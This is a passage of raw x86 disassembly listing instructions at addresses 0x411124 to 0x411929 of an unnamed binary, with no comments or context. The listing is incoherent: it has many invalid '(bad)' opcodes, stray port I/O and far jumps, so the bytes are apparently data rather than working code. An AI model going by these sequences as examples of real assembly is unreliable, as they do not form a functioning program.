  411124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411125:	pop    ss
  411126:	pop    ebx
  411127:	adc    BYTE PTR [eax-0x22],0xbc
  41112b:	stos   DWORD PTR es:[edi],eax
  41112c:	dec    esp
  41112d:	mov    dl,0xc6
  41112f:	clc    
  411130:	mov    al,ds:0x379b295a
  411135:	dec    ebx
  411136:	and    BYTE PTR [edi-0x7a0f3a6a],bh
  41113c:	test   eax,0x30eba946
  411141:	stc    
  411142:	mov    bl,0x0
  411144:	scas   al,BYTE PTR es:[edi]
  411145:	push   edx
  411146:	push   edi
  411147:	jp     0x4110ce
  411149:	out    dx,al
  41114a:	jle    0x4111c8
  41114c:	mov    bl,0xa2
  41114e:	jecxz  0x4110f8
  411150:	xlat   BYTE PTR ds:[ebx]
  411151:	add    dh,BYTE PTR [ebx]
  411153:	dec    ecx
  411154:	pusha  
  411155:	sbb    edx,DWORD PTR [ebp+ecx*1-0x5eab206a]
  41115c:	jl     0x411165
  41115e:	xchg   ecx,eax
  41115f:	clc    
  411160:	inc    ecx
  411161:	aad    0x73
  411163:	dec    esi
  411164:	add    ch,BYTE PTR [eax-0xb]
  411167:	or     ch,BYTE PTR [esi+0x5a5045ad]
  41116d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41116e:	out    0xd0,eax
  411170:	ret    
  411171:	loop   0x4110f3
  411173:	push   esi
  411174:	jmp    0xcbd4:0x38b1edb7
  41117b:	add    eax,0xe8cb4767
  411180:	fcomp  DWORD PTR [edi+0x2d00c472]
  411186:	and    bl,cl
  411188:	std    
  411189:	sbb    ah,BYTE PTR [ebx+0x4175304b]
  41118f:	xchg   edx,eax
  411190:	in     al,0xcd
  411192:	add    eax,DWORD PTR [edx+0x2fd3cbcc]
  411198:	dec    edi
  411199:	xchg   ecx,eax
  41119a:	add    ebp,DWORD PTR ds:0xdc0c0118
  4111a0:	pop    ss
  4111a1:	sub    edi,ebx
  4111a3:	cwde   
  4111a4:	in     eax,0x36
  4111a6:	pushf  
  4111a7:	cmc    
  4111a8:	lods   eax,DWORD PTR ds:[esi]
  4111a9:	mov    cl,0x3f
  4111ab:	push   0x98aabe85
  4111b0:	mov    dh,0x84
  4111b2:	mov    ds:0xb9184219,al
  4111b7:	(bad)  
  4111b8:	(bad)  
  4111b9:	mov    edx,0x30e2a4a9
  4111be:	push   DWORD PTR [eax+0x28]
  4111c1:	jle    0x4111b9
  4111c3:	xor    eax,0x775340b1
  4111c8:	inc    esp
  4111c9:	mov    eax,0xc7e12d6a
  4111ce:	dec    edi
  4111cf:	(bad)  
  4111d0:	mov    WORD PTR [ebx],ds
  4111d2:	bound  edx,QWORD PTR [edi-0x4279e9de]
  4111d8:	sbb    esi,DWORD PTR ds:0x1a6f374b
  4111de:	ror    BYTE PTR [ebp-0x49],cl
  4111e1:	lods   al,BYTE PTR ds:[esi]
  4111e2:	add    BYTE PTR [esi],0x4
  4111e5:	push   0x1b
  4111e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111e8:	idiv   BYTE PTR [ebx+0x2e]
  4111eb:	hlt    
  4111ec:	xlat   BYTE PTR ds:[ebx]
  4111ed:	mov    dh,0xa2
  4111ef:	pop    eax
  4111f0:	in     al,0x31
  4111f2:	jecxz  0x4111e8
  4111f4:	retf   
  4111f5:	das    
  4111f6:	or     eax,0x2f33d815
  4111fb:	icebp  
  4111fc:	push   edi
  4111fd:	dec    edi
  4111fe:	test   al,0xa0
  411200:	xor    ah,al
  411202:	arpl   ax,sp
  411204:	xchg   edx,eax
  411205:	outs   dx,DWORD PTR ds:[esi]
  411206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411207:	mov    eax,ds:0x542b91e3
  41120c:	mov    cl,0xb2
  41120e:	in     al,0xbb
  411210:	mov    ecx,0xd37a2196
  411215:	mov    esp,0x38ea4af7
  41121a:	rcl    cl,0x60
  41121d:	jge    0x41126e
  41121f:	fidiv  WORD PTR [ecx+0x3ef246d3]
  411225:	fwait
  411226:	and    BYTE PTR [ebx+0x5f32cbed],al
  41122c:	aas    
  41122d:	sub    BYTE PTR [esi+0x53],dh
  411230:	cmp    eax,0x49fb9f41
  411235:	or     al,0x2f
  411237:	fisub  DWORD PTR [edi-0x48]
  41123a:	pop    es
  41123b:	stc    
  41123c:	mov    BYTE PTR [ebx+0x29],ch
  41123f:	fbld   TBYTE PTR [eax+edi*4+0x7956c463]
  411246:	inc    ecx
  411247:	aad    0xf2
  411249:	pushf  
  41124a:	cmp    BYTE PTR [ebp-0x244561b9],al
  411250:	out    dx,eax
  411251:	push   edi
  411252:	hlt    
  411253:	call   0x9def5868
  411258:	fisttp QWORD PTR [esi+esi*2+0x2e66b9e3]
  41125f:	and    bh,al
  411261:	mov    bl,BYTE PTR [edx+esi*4+0x7f3d362d]
  411268:	jb     0x411201
  41126a:	push   eax
  41126b:	add    DWORD PTR [edx-0x6d],ebx
  41126e:	push   0xffffff86
  411270:	test   BYTE PTR [eax+0x1eb856b7],ch
  411276:	inc    edi
  411277:	and    DWORD PTR [edx-0x5916b474],ebx
  41127d:	(bad)  
  41127e:	outs   dx,DWORD PTR ds:[esi]
  41127f:	mov    eax,0x46316e85
  411284:	cdq    
  411285:	adc    DWORD PTR [esi-0x72],eax
  411288:	mov    BYTE PTR [esp+edi*2-0x79a05cae],dl
  41128f:	js     0x411306
  411291:	js     0x4112f5
  411293:	jne    0x41126c
  411295:	out    dx,eax
  411296:	(bad)  
  411297:	jmp    0x1ecf:0xe7307d88
  41129e:	adc    DWORD PTR ss:[ebx+0x6d],esi
  4112a2:	pop    es
  4112a3:	fcomp  DWORD PTR [edi-0x3c]
  4112a6:	arpl   WORD PTR [ebx],bx
  4112a8:	mov    edi,0xcc5caeb5
  4112ad:	xor    DWORD PTR [edx-0x1b14060f],esi
  4112b3:	sbb    BYTE PTR [esi+0x52b1d01],ch
  4112b9:	xor    ax,0xa0f2
  4112bd:	in     eax,dx
  4112be:	ret    
  4112bf:	(bad)  
  4112c1:	stos   DWORD PTR es:[edi],eax
  4112c2:	sub    esp,edi
  4112c4:	(bad)  
  4112c5:	and    ecx,eax
  4112c7:	test   eax,0xa279f68f
  4112cc:	and    eax,0x93bf1af0
  4112d1:	adc    BYTE PTR [ebp+0x69],bh
  4112d4:	xor    DWORD PTR [edi-0x34],esi
  4112d7:	in     eax,dx
  4112d8:	mov    dl,0x24
  4112da:	ds jb  0x4112a8
  4112dd:	adc    eax,0x8e5da72b
  4112e2:	pop    edi
  4112e3:	clc    
  4112e4:	and    ebp,eax
  4112e6:	sub    DWORD PTR [ecx+0x6822efa9],edi
  4112ec:	ins    BYTE PTR es:[edi],dx
  4112ed:	sbb    BYTE PTR [ebx+0x40f2e8ef],ch
  4112f3:	push   ss
  4112f4:	push   0x4b12670d
  4112f9:	cmp    edi,DWORD PTR [ebp+0x5f250e85]
  4112ff:	sub    edx,DWORD PTR [edx-0x34bb9967]
  411305:	inc    esp
  411306:	lahf   
  411307:	xor    eax,ecx
  411309:	mov    esi,0x66d8bb72
  41130e:	jnp    0x41132e
  411310:	jecxz  0x411295
  411312:	out    0xd3,al
  411314:	iret   
  411315:	sub    eax,0x6be9724b
  41131a:	div    DWORD PTR [eax+0x6a3a7f6]
  411320:	fcomp  QWORD PTR [ebx+0x37]
  411323:	jb     0x411301
  411325:	into   
  411326:	sub    DWORD PTR [eax],0x2e
  411329:	sti    
  41132a:	push   ebp
  41132b:	loop   0x411355
  41132d:	sahf   
  41132e:	inc    ebp
  41132f:	push   ebx
  411330:	push   ebx
  411331:	aad    0x27
  411333:	scas   al,BYTE PTR es:[edi]
  411334:	aaa    
  411335:	fs (bad) 
  411337:	enter  0xb74a,0xe0
  41133b:	test   DWORD PTR [esi],0xc734346d
  411341:	mov    fs,WORD PTR [esi]
  411343:	pop    esp
  411344:	int    0xf9
  411346:	mov    BYTE PTR [edx-0x5e087dbd],0xe3
  41134d:	cmp    al,0xf3
  41134f:	aaa    
  411350:	shr    DWORD PTR [edx-0x51cdf1f],1
  411356:	(bad)  
  411357:	sub    ecx,edx
  411359:	popf   
  41135a:	inc    edx
  41135b:	dec    eax
  41135c:	hlt    
  41135d:	pusha  
  41135e:	(bad)  
  41135f:	mov    al,ds:0x1a22f577
  411364:	fwait
  411365:	xchg   edx,eax
  411366:	mov    dl,BYTE PTR [ecx+0x62]
  411369:	(bad)  
  41136a:	jl     0xf10f2a6d
  411370:	cmp    DWORD PTR ds:0x9a6c627,eax
  411376:	inc    DWORD PTR ds:0x893d9fa5
  41137c:	sti    
  41137d:	shr    esi,1
  41137f:	xchg   esi,eax
  411380:	mov    edi,0x75595689
  411385:	inc    esi
  411386:	cld    
  411387:	repz mov gs,WORD PTR [edx+0x10a10111]
  41138e:	or     dl,BYTE PTR [edi-0x63e4b73a]
  411394:	sub    al,0x5d
  411396:	mov    dh,0xe7
  411398:	add    al,0x5b
  41139a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139b:	test   eax,0x2a29fd51
  4113a0:	mov    bl,0xd
  4113a2:	mov    DWORD PTR [ecx-0x7d],esp
  4113a5:	imul   esi,DWORD PTR [edi-0x5ff0555e],0x3f
  4113ac:	xor    bl,bh
  4113ae:	aam    0x7d
  4113b0:	inc    ebx
  4113b1:	cmp    dh,BYTE PTR [edx+ecx*1]
  4113b4:	dec    ecx
  4113b5:	add    ah,0x5a
  4113b8:	jmp    0x9a24c277
  4113bd:	xor    ebx,DWORD PTR [ecx]
  4113bf:	push   esi
  4113c0:	sti    
  4113c1:	repnz in al,0x79
  4113c4:	test   al,0x55
  4113c6:	mov    ds:0xa397ba58,al
  4113cb:	ret    0x3a57
  4113ce:	into   
  4113cf:	mov    edi,0xda00f04b
  4113d4:	mov    al,ds:0xc3cfe361
  4113d9:	sub    DWORD PTR [edi],0x34
  4113dc:	push   ds
  4113dd:	mov    al,ds:0x47febe6f
  4113e2:	pop    ds
  4113e3:	fdivr  DWORD PTR [esi-0x77]
  4113e6:	inc    edi
  4113e7:	pop    edx
  4113e8:	xor    eax,DWORD PTR [ebx-0x7ce506]
  4113ee:	bound  esp,QWORD PTR [esi-0x3e]
  4113f1:	enter  0xfd31,0x57
  4113f5:	sbb    eax,0x486a643a
  4113fa:	push   ecx
  4113fb:	push   0xa2291915
  411400:	hlt    
  411401:	dec    edx
  411402:	xchg   edx,eax
  411403:	nop
  411404:	xlat   BYTE PTR ds:[ebx]
  411405:	out    dx,eax
  411406:	xchg   ebp,eax
  411407:	inc    cl
  411409:	sub    cl,al
  41140b:	and    eax,DWORD PTR ds:0x11abcaf2
  411411:	mov    ch,0xa3
  411413:	mov    WORD PTR [edi],gs
  411415:	adc    ah,BYTE PTR [ebp-0x7a]
  411418:	adc    cl,BYTE PTR [ebx-0x23]
  41141b:	retf   0x2caa
  41141e:	lock add dh,dh
  411421:	sahf   
  411422:	test   al,0xbf
  411424:	fist   WORD PTR [edx+0x4a]
  411427:	test   eax,0xd6ea07b
  41142c:	jb     0x411407
  41142e:	jns    0x411454
  411430:	stos   BYTE PTR es:[edi],al
  411431:	in     eax,dx
  411432:	and    DWORD PTR [ecx-0x68872dcb],esp
  411438:	xchg   dl,ch
  41143a:	out    dx,al
  41143b:	ror    BYTE PTR [ebp-0x2d],1
  41143e:	or     BYTE PTR [ebp+ebp*4+0x3b],bh
  411442:	inc    ecx
  411443:	push   ecx
  411444:	ins    BYTE PTR es:[edi],dx
  411445:	sub    dl,BYTE PTR [edi-0x257024b1]
  41144b:	mov    ds:0xa32ad0aa,eax
  411450:	fcom   DWORD PTR [edi]
  411452:	cwde   
  411453:	inc    ecx
  411454:	imul   ebp,DWORD PTR [ebp+edi*2+0x458e3836],0xffffffc8
  41145c:	ss xchg ecx,eax
  41145e:	into   
  41145f:	fcomi  st,st(0)
  411461:	pop    eax
  411462:	stos   BYTE PTR es:[edi],al
  411463:	clc    
  411464:	pop    ebx
  411465:	sti    
  411466:	out    dx,eax
  411467:	je     0x4114df
  411469:	fcmovne st,st(5)
  41146b:	xchg   esi,eax
  41146c:	je     0x411458
  41146e:	adc    dh,ch
  411470:	inc    ebp
  411471:	xchg   edi,eax
  411472:	es scas eax,DWORD PTR es:[edi]
  411474:	mov    ah,0x51
  411476:	pop    edi
  411477:	cmp    eax,DWORD PTR [esi]
  411479:	mov    WORD PTR [edx+0x3816d872],gs
  41147f:	out    0x51,al
  411481:	inc    ebp
  411482:	lods   eax,DWORD PTR ds:[esi]
  411483:	repnz push esi
  411485:	daa    
  411486:	pop    eax
  411487:	pushf  
  411488:	mov    eax,ds:0x1a69cfb5
  41148d:	push   eax
  41148e:	sbb    eax,0x8f5d3b12
  411493:	mov    cl,0x1e
  411495:	xchg   ecx,eax
  411496:	sbb    eax,0x162cb817
  41149b:	mov    cs,WORD PTR [edi+ecx*8-0x3]
  41149f:	jmp    0x4114df
  4114a1:	mov    bl,0x6d
  4114a3:	xchg   ebx,eax
  4114a4:	cmp    BYTE PTR [esi+0x5802fb6c],bl
  4114aa:	jge    0x411479
  4114ac:	mov    dl,ah
  4114ae:	inc    eax
  4114af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b0:	lods   al,BYTE PTR ds:[esi]
  4114b1:	out    dx,eax
  4114b2:	jp     0x411516
  4114b4:	cmp    DWORD PTR [ebx+esi*4+0x5a],ebp
  4114b8:	test   DWORD PTR [esi+0x5d],ecx
  4114bb:	test   al,0xab
  4114bd:	and    edi,ebp
  4114bf:	call   0x1fd5a008
  4114c4:	jnp    0x411517
  4114c6:	cmc    
  4114c7:	mov    edi,0x914a0334
  4114cc:	jbe    0x4114fd
  4114ce:	lods   eax,DWORD PTR ds:[esi]
  4114cf:	cmp    DWORD PTR [edx-0x5e863c3a],edi
  4114d5:	inc    esp
  4114d6:	imul   eax,DWORD PTR [ebx],0xffffff8d
  4114d9:	xor    eax,0x380fd4a
  4114de:	outs   dx,BYTE PTR ds:[esi]
  4114df:	nop
  4114e0:	mov    ecx,0x9477dfaf
  4114e5:	call   0x47e4bfa6
  4114ea:	daa    
  4114eb:	xchg   esp,eax
  4114ec:	pushf  
  4114ed:	sub    eax,DWORD PTR [esi+ebp*8+0x5014957f]
  4114f4:	fistp  DWORD PTR [ecx+0x3e4beac9]
  4114fa:	mov    dl,0xc0
  4114fc:	(bad)  
  4114fe:	out    dx,eax
  4114ff:	dec    edi
  411500:	ins    BYTE PTR es:[edi],dx
  411501:	(bad)  
  411502:	pop    ecx
  411503:	jge    0x41156c
  411505:	mov    eax,DWORD PTR [esi+0x79254a90]
  41150b:	xor    eax,0xea86aeb0
  411510:	scas   al,BYTE PTR es:[edi]
  411511:	mov    al,0x44
  411513:	sbb    edi,DWORD PTR [ebp-0x65]
  411516:	pusha  
  411517:	xchg   edx,eax
  411518:	outs   dx,BYTE PTR ds:[esi]
  411519:	pop    edx
  41151a:	xor    dl,cl
  41151c:	repnz lods eax,DWORD PTR ds:[esi]
  41151e:	adc    eax,0x93bccea8
  411523:	pop    ebp
  411524:	push   edi
  411525:	add    DWORD PTR [eax+edx*8],esi
  411528:	rcr    BYTE PTR [edx+0x1a69228c],cl
  41152e:	pop    ss
  41152f:	sahf   
  411530:	push   esp
  411531:	pusha  
  411532:	or     al,0x55
  411535:	add    dl,ch
  411537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411538:	mov    ebx,0x93ab598f
  41153d:	dec    esi
  41153e:	jmp    0x2fe8:0xdf62656e
  411545:	fs adc edi,ebp
  411548:	rcl    eax,0x5f
  41154b:	mov    al,ds:0xcc8bbfb
  411550:	lds    edi,FWORD PTR [ebp-0x4649599d]
  411556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411557:	fdiv   QWORD PTR [ebx-0x4b8b9828]
  41155d:	fdivr  st,st(3)
  41155f:	dec    edx
  411560:	or     esi,ebx
  411562:	ins    DWORD PTR es:[edi],dx
  411563:	inc    ecx
  411564:	(bad)
  411568:	lods   eax,DWORD PTR ds:[esi]
  411569:	in     al,dx
  41156a:	in     al,0xe1
  41156c:	jle    0x4115c2
  41156e:	inc    edx
  41156f:	sub    esi,DWORD PTR [ecx-0x68]
  411572:	fwait
  411573:	add    dh,BYTE PTR [edx+eax*1]
  411576:	inc    esi
  411577:	das    
  411578:	fst    st(3)
  41157a:	call   ecx
  41157c:	xor    ch,dh
  41157e:	out    0xd8,al
  411580:	test   BYTE PTR [ecx+0x2677f896],dl
  411586:	ret    
  411587:	jl     0x4115d4
  411589:	aas    
  41158a:	cli    
  41158b:	xchg   esp,eax
  41158c:	push   ebx
  41158d:	aam    0x89
  41158f:	cmp    DWORD PTR [ecx+ebx*4],ebp
  411592:	inc    ecx
  411593:	cmp    eax,ebx
  411595:	cmp    BYTE PTR [esi],bh
  411597:	push   esi
  411598:	jmp    0x2d:0x54507ce7
  41159f:	jmp    0x411593
  4115a1:	adc    eax,0x59e01937
  4115a6:	mov    cl,BYTE PTR [edi-0x6cb65afc]
  4115ac:	jmp    0xd910:0xe8f2663a
  4115b3:	gs lock xchg ecx,eax
  4115b6:	dec    ecx
  4115b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115b8:	lods   eax,DWORD PTR ds:[esi]
  4115b9:	arpl   WORD PTR [ecx+0x70dadf66],cx
  4115bf:	xchg   edx,eax
  4115c0:	sub    DWORD PTR [ecx],edx
  4115c2:	mov    bh,0x64
  4115c4:	div    DWORD PTR [eax]
  4115c6:	add    ebx,ebx
  4115c8:	jnp    0x4115a5
  4115ca:	stos   BYTE PTR es:[edi],al
  4115cb:	jmp    0x699b5ec0
  4115d0:	sub    dl,BYTE PTR [edx+eiz*4-0x695fe247]
  4115d7:	mov    DWORD PTR [ebp+0x74c72df2],esp
  4115dd:	jb     0x4115a4
  4115df:	ss call 0x72244abd
  4115e5:	sbb    dh,BYTE PTR [edx-0x22299273]
  4115eb:	pop    esi
  4115ec:	jb     0x411583
  4115ee:	xor    BYTE PTR [esi],0xfc
  4115f1:	mov    ?,WORD PTR [ebp+0x2c]
  4115f4:	paddsw mm4,mm5
  4115f7:	push   esi
  4115f8:	retf   0x5be1
  4115fb:	xor    al,0x7b
  4115fd:	in     al,dx
  4115fe:	dec    ebx
  4115ff:	loop   0x4115d5
  411601:	inc    edi
  411602:	adc    ch,BYTE PTR ds:0xa0068147
  411608:	sbb    al,BYTE PTR [edi+0x54f71961]
  41160e:	pop    ds
  41160f:	or     al,0x6e
  411611:	in     eax,dx
  411612:	fcmovbe st,st(7)
  411614:	je     0x41165f
  411616:	mov    DWORD PTR [edx+edx*2+0x7e85814e],esi
  41161d:	imul   ebx,DWORD PTR [esi+0x31],0xefa5a780
  411624:	jmp    0x411647
  411626:	mov    ds:0x9d7d781e,al
  41162b:	stc    
  41162c:	imul   edx,DWORD PTR [ecx],0xb160f43b
  411632:	sub    DWORD PTR [ecx-0x4f804833],ebp
  411638:	mov    ds,WORD PTR [ebp-0x1]
  41163b:	mov    bl,0x27
  41163d:	add    edx,DWORD PTR [edi-0x49]
  411640:	mov    eax,ds:0x749cb9e3
  411645:	adc    BYTE PTR [edx+ebp*4-0x6eb77b90],ah
  41164c:	pop    esi
  41164d:	sbb    BYTE PTR [bx],dl
  411650:	mov    edi,0x35fa63ce
  411655:	sbb    al,0x44
  411657:	xchg   esi,eax
  411658:	test   BYTE PTR [ebx-0x17ef0a36],dl
  41165e:	xchg   esp,eax
  41165f:	cmp    BYTE PTR [edi],dh
  411661:	out    0x46,al
  411663:	adc    eax,0xfbc8c702
  411668:	test   eax,0xd81dbfb6
  41166d:	pop    eax
  41166e:	aaa    
  41166f:	outs   dx,BYTE PTR ss:[esi]
  411671:	div    DWORD PTR [ebx]
  411673:	stos   BYTE PTR es:[edi],al
  411674:	in     eax,dx
  411675:	jmp    0x411649
  411677:	call   0xfd01:0x449bab79
  41167e:	inc    esp
  41167f:	xchg   edx,eax
  411680:	ds mov ebx,0xbb32e247
  411686:	adc    bh,BYTE PTR [edx-0x499e9285]
  41168c:	and    dh,BYTE PTR [eax]
  41168e:	adc    cl,BYTE PTR [ebp+edi*1+0x77f245c4]
  411695:	push   0x9343c4e0
  41169a:	dec    ecx
  41169b:	fdivr  QWORD PTR [ebx-0x45]
  41169e:	test   DWORD PTR [esi+0x58a9781c],edi
  4116a4:	cmp    eax,0xe35ed821
  4116a9:	sbb    DWORD PTR [ebx],edi
  4116ab:	or     esp,DWORD PTR [ebp-0x141b2ab]
  4116b1:	jnp    0x41165c
  4116b3:	jae    0x41171b
  4116b5:	push   ebp
  4116b6:	fdiv   QWORD PTR [ebp-0x76a90714]
  4116bc:	and    DWORD PTR [ecx],0x57
  4116bf:	int3   
  4116c0:	sub    al,0xce
  4116c2:	retf   
  4116c3:	mov    edx,0xc94a8a7e
  4116c8:	fistp  DWORD PTR ds:0x30e1d39d
  4116ce:	clc    
  4116cf:	mov    esi,0xb5d10dac
  4116d4:	or     dh,BYTE PTR [ecx-0x79]
  4116d7:	mov    edi,0x7d3b8d06
  4116dc:	xor    esp,DWORD PTR [edi]
  4116de:	test   al,0xa2
  4116e0:	jmp    0x411665
  4116e2:	fst    st(2)
  4116e4:	and    al,0x6
  4116e6:	loope  0x41174d
  4116e8:	cmp    al,0x6d
  4116ea:	adc    eax,0x7f58b1d0
  4116ef:	test   BYTE PTR [ecx],ah
  4116f1:	(bad)
  4116f5:	xor    ecx,esi
  4116f7:	mov    esi,0xc9dc8f45
  4116fc:	xor    eax,0xe8656791
  411701:	xchg   esi,eax
  411702:	aaa    
  411703:	fsubr  QWORD PTR [edi+0x32]
  411706:	pop    ds
  411707:	in     eax,dx
  411708:	push   0x4edd0187
  41170d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170e:	inc    edi
  41170f:	mov    dl,0xa1
  411711:	jg     0x41178e
  411713:	lods   eax,DWORD PTR ds:[esi]
  411714:	fst    QWORD PTR [ecx]
  411716:	stos   BYTE PTR es:[edi],al
  411717:	scas   eax,DWORD PTR es:[edi]
  411718:	arpl   WORD PTR [esp+ecx*1+0x4107cb10],di
  41171f:	ins    BYTE PTR es:[edi],dx
  411720:	scas   eax,DWORD PTR es:[edi]
  411721:	pop    ds
  411722:	sub    BYTE PTR [esi+eiz*1-0x339313d6],ah
  411729:	add    esp,ebx
  41172b:	pusha  
  41172c:	lods   eax,DWORD PTR ds:[esi]
  41172d:	push   cs
  41172e:	daa    
  41172f:	jo     0x411797
  411731:	sub    BYTE PTR [ebx-0x8],cl
  411734:	cdq    
  411735:	enter  0xbb9f,0x4c
  411739:	or     al,0x57
  41173b:	adc    ah,BYTE PTR [ecx+0x282b9bdf]
  411741:	mov    BYTE PTR [ebp-0x51],ch
  411744:	inc    esi
  411745:	add    eax,0xc426d40
  41174a:	push   ebx
  41174b:	xchg   ecx,eax
  41174c:	sbb    BYTE PTR ds:[esp+edx*1],dh
  411750:	xlat   BYTE PTR ds:[ebx]
  411751:	xor    al,BYTE PTR [ecx+0x5c]
  411754:	pop    ebp
  411755:	mov    ecx,0x542c1afd
  41175a:	cwde   
  41175b:	fdiv   DWORD PTR [ebx]
  41175d:	or     esi,esp
  41175f:	xchg   edi,edi
  411761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411762:	out    0xf9,eax
  411764:	or     eax,0xe226d321
  411769:	mov    ebp,DWORD PTR [ebp+0x205fb6e5]
  41176f:	mov    edx,0x79577ca5
  411774:	mov    bh,0x2c
  411776:	mov    bl,0x82
  411778:	or     BYTE PTR [eax+0x4f1c652b],bl
  41177e:	jecxz  0x411702
  411780:	(bad)
  411783:	fstp   QWORD PTR [edx+esi*1]
  411786:	fcomp  DWORD PTR [ecx+0x651cc36a]
  41178c:	loope  0x4117f3
  41178e:	das    
  41178f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411790:	(bad)  
  411791:	test   eax,0x83a4dce7
  411796:	fiadd  DWORD PTR [edi]
  411798:	mov    esi,0xd849b7d1
  41179d:	push   eax
  41179e:	push   ds
  41179f:	ins    BYTE PTR es:[edi],dx
  4117a0:	rcl    bh,cl
  4117a2:	sar    cl,0xc7
  4117a5:	lods   al,BYTE PTR ds:[esi]
  4117a6:	xor    bh,bl
  4117a8:	pop    ebx
  4117a9:	test   eax,0x515eff1c
  4117ae:	cmc    
  4117af:	mov    ?,edx
  4117b1:	int    0x2f
  4117b3:	mov    WORD PTR [edi],ds
  4117b5:	std    
  4117b6:	sub    ebp,DWORD PTR [edx+eax*4+0x30d377b1]
  4117bd:	or     esp,DWORD PTR [ebx+ebp*1+0x6d]
  4117c1:	and    esi,DWORD PTR [esi+0x634232e3]
  4117c7:	sub    al,0xd5
  4117c9:	jge    0x41181d
  4117cb:	push   edx
  4117cc:	maskmovq mm5,mm0
  4117cf:	sub    ah,BYTE PTR ds:0x1cdd02b3
  4117d5:	sbb    eax,0x4f857981
  4117da:	or     al,0x78
  4117dc:	lock jnp 0x411832
  4117df:	mov    eax,0xf4ed4539
  4117e4:	out    dx,eax
  4117e5:	dec    edx
  4117e6:	pop    es
  4117e7:	mov    eax,0xf282c98f
  4117ec:	adc    al,dl
  4117ee:	cld    
  4117ef:	imul   esi,DWORD PTR [ebx+esi*2+0x473aeef3],0xa190efac
  4117fa:	popa   
  4117fb:	loop   0x41182e
  4117fd:	and    eax,0xa68fbf80
  411802:	push   esp
  411803:	sti    
  411804:	xor    bh,BYTE PTR [esi]
  411806:	fcmovnb st,st(6)
  411808:	out    dx,al
  411809:	push   ss
  41180a:	xor    BYTE PTR [esi-0x7727b586],0xa5
  411811:	mul    bh
  411813:	out    dx,al
  411814:	daa    
  411815:	sti    
  411816:	xchg   ebp,eax
  411817:	or     al,0x23
  411819:	inc    ecx
  41181a:	jns    0x4117d9
  41181c:	arpl   WORD PTR [esi-0x12],dx
  41181f:	mov    esi,0xf0b16b5
  411824:	ins    BYTE PTR es:[edi],dx
  411825:	std    
  411826:	xlat   BYTE PTR ds:[ebx]
  411827:	cmp    BYTE PTR [edx-0x7f],ch
  41182a:	ror    edx,cl
  41182c:	aam    0x84
  41182e:	or     ecx,DWORD PTR es:[edx-0x28167ecf]
  411835:	popa   
  411836:	rcr    DWORD PTR [eax+0x261855f8],cl
  41183c:	push   esi
  41183d:	sbb    al,0x95
  41183f:	push   esp
  411840:	mov    al,0x1b
  411842:	inc    ebx
  411843:	imul   ebp,edi,0x25722942
  411849:	mov    edi,0xda66380b
  41184e:	push   0x59619009
  411853:	xchg   ebp,eax
  411854:	daa    
  411855:	adc    eax,0xbaf6a6ca
  41185a:	arpl   bp,sp
  41185c:	cmp    al,0xd5
  41185e:	les    edx,FWORD PTR [esi]
  411860:	xor    al,0xd3
  411862:	and    dh,BYTE PTR [edx]
  411864:	gs push ss
  411866:	sub    ebp,DWORD PTR [esi+eax*4+0x22]
  41186a:	scas   eax,DWORD PTR es:[edi]
  41186b:	fimul  DWORD PTR [edx+0x73b1d845]
  411871:	sbb    DWORD PTR ds:0x4f0b5136,esp
  411877:	rol    ebp,0xfd
  41187a:	inc    edi
  41187b:	retf   
  41187c:	jae    0x411899
  41187e:	and    BYTE PTR [esi+0x3f671d43],0xa3
  411885:	xor    edx,esi
  411887:	daa    
  411888:	mov    dl,0x41
  41188a:	sbb    DWORD PTR [ebx+0x17880d3f],esi
  411890:	push   esp
  411891:	xchg   esi,eax
  411892:	adc    ch,0x6f
  411895:	sub    esp,ebx
  411897:	sub    BYTE PTR [ebx-0xeb7385b],bh
  41189d:	xchg   esi,eax
  41189e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41189f:	xchg   bh,cl
  4118a1:	sub    al,0xed
  4118a3:	call   0x32c0:0x86786fd5
  4118aa:	pop    edx
  4118ab:	test   BYTE PTR [edx+0x6e],ch
  4118ae:	cs jmp 0x411889
  4118b1:	mov    eax,ds:0x75ed115
  4118b6:	aaa    
  4118b7:	mov    esp,0xfae08fad
  4118bc:	jno    0x41184a
  4118be:	adc    eax,0x2ba63d17
  4118c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118c4:	push   cs
  4118c5:	sti    
  4118c6:	xchg   ecx,eax
  4118c7:	pop    edx
  4118c8:	(bad)  
  4118c9:	aam    0x85
  4118cb:	and    esi,DWORD PTR [edi]
  4118cd:	in     eax,0x91
  4118cf:	sub    esp,DWORD PTR [edi+0x14]
  4118d2:	add    cl,ah
  4118d4:	(bad)  
  4118d5:	fld    TBYTE PTR [esi]
  4118d7:	or     al,0xbd
  4118d9:	shr    BYTE PTR [eax],0xd0
  4118dc:	loopne 0x41194a
  4118de:	es loope 0x41191a
  4118e1:	dec    eax
  4118e2:	mov    bh,0x28
  4118e4:	sbb    ch,BYTE PTR [ebp+0xa]
  4118e7:	or     ebp,DWORD PTR [edx]
  4118e9:	xor    dh,al
  4118eb:	imul   esi,DWORD PTR [esi],0x40
  4118ee:	out    0x83,al
  4118f0:	sbb    eax,0x92068d47
  4118f5:	(bad)  
  4118f6:	jne    0x4118f4
  4118f8:	fsubr  DWORD PTR [ebp+0x27]
  4118fb:	pop    edi
  4118fc:	adc    edi,esi
  4118fe:	sbb    eax,0x50c89e8
  411903:	xor    BYTE PTR [edi],ch
  411905:	repz inc esi
  411907:	jmp    0x8528:0x8be0e6b
  41190e:	inc    esp
  41190f:	push   esp
  411910:	shl    esi,cl
  411912:	xor    esp,edx
  411914:	mov    edi,0xb0d49d09
  411919:	(bad)  
  41191a:	dec    edi
  41191b:	push   ebp
  41191c:	imul   esi,DWORD PTR [edx],0xffffffb9
  41191f:	or     ecx,DWORD PTR ds:0x291c6f1b
  411925:	xor    dh,bh
  411927:	es push edi
  411929:	mov    ebp,0x96192a73
